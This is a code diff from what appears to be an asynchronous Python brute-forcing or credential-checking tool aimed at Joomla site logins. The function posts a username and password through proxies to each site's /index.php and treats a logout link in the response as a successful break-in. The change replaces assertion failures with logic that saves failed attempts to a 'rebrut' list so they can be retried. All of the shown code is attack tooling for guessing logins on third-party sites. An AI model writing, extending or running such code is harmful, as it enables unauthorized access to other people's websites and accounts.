@@ -138,10 +138,14 @@ async def Joomla(link, user, passw, proxy):
         with silent_out():
             async with ClientSession(connector=cproxy) as s:
                 data = await first(s, link)
-                assert await valid(data[1], data[0], link) is True
+                if not await valid(data[1], data[0], link):
+                    await save('rebrut', f'{link} - {user}:{passw}')
+                    return
 
                 _post = await Parse(data[0], user, passw)
-                assert _post is not None
+                if _post is None:
+                    await save('rebrut', f'{link} - {user}:{passw}')
+                    return
 
                 data = await second(s, link+'/index.php', _post)
                 assert '&amp;task=logout&amp' in data[0]
